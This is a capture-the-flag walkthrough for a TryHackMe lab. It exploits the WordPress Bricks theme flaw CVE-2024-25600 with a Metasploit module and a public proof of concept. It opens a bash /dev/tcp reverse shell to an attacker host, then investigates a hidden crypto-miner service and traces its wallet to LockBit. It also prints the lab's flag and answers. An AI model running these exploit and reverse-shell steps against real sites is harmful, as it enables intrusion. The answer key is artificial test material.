# TryHack3M: Bricks Heist

- bricks and rce are clearly going to be clues to solving this challenge

- An nmap scan reveals a Wordpress site using the Bricks theme
- A quick search for vulnerabilities affecting the Bricks theme reveals CVE-2024-25600

- Doing a quick search in metasploit provides a Bricks rce module

```
use exploit/multi/http/wp_bricks_builder_rce

set rport 443
set rhost https://bricks.thm/
set lhost <local ip>
exploit
```

This will create a merpreter session and allow us to grab the first few answers

`cat 650c844110baced87e1606453b93f22a.txt`

Q: What is the content of the hidden .txt file in the web folder?

```
THM{fl46_650c844110baced87e1606453b93f22a}
```

I struggled with my meterpreter session dying anytime I tried to drop into a system shell.
Rather than try to fight with that option I decided to explore other publically avaialable exploit PoCs.
While all worked to some degree or another, they didn't all provide necessary functionality to navigate the system (e.g. not being able to use 'cd').
The following PoC provided the best opportunity to create a stable shell (of the ones tested)
https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT

and allowed a reverse connection with 'bash' and 'nc' using the following commands:

Attacker box:
`nc -lvnp <port>`

Victim machine:
`bash -c 'exec bash -i &>/dev/tcp/<attacker ip>/<YOUR_PORT> <&1'`

Now we can freely move around and get to the rest of the questions

Q: What is the name of the suspicious process?


`systemctl | grep running`

reveals ubuntu.service with a description of "TRYHACK3M"...clearly a red flag but ubuntu.service

Investigating further...

`systemctl cat ubuntu.service`

...shows us that this service is executed by nm-inet-dialog with the line "ExecStart=/lib/NetworkManager/nm-inet-dialog" providing the answer

```
nm-inet-dialog
```

and we already discovered the answer to the following question in the aforementioned service name

Q: What is the service name affiliated with the suspicious process?

```
ubuntu.service
```

Q: What is the log file name of the miner instance?

A logical place to start would be where the binary in the above service resides

`cd /lib/NetworkManager`

```
cd /lib/NetworkManager
ls
```
Here we find an interesting file called inet.conf

`cat inet.conf`

Sure enough, this is our log file

```
inet.conf
```

Q: What is the wallet address of the miner instance?

Once again, let's follow the bread crumbs and see what the log contains. Within the first few lines there is an interesting blob of encoded data;

`head inet.conf`

The encoded data:
```
5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
```

Dropping this into Cyberchef and running the "Magic" decode option reveals two crypto wallet addresses. The actual recipe steps to get the address are
- From Hex
- From Base64
- From Base64
Only one of these is the valid answer; you can just try both or look up the addresses in a BTC wallet lookup site to confirm the valid one

```
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
bc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa
```

Now to our last question:

Q: The wallet address used has been involved in transactions between wallets belonging to which threat group?

Doing some searching on the wallet address in the previous answer will lead you to the threat group in question.

How I arrived there was to review transactions on the site where I looked up the wallet address (blockchain.com)

reviewing a transaction of 4 bitcoin being sent to another address led me to wallet: "32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM"

Searching on that wallet produced multiple results referencing LockBit

```
lockbit
```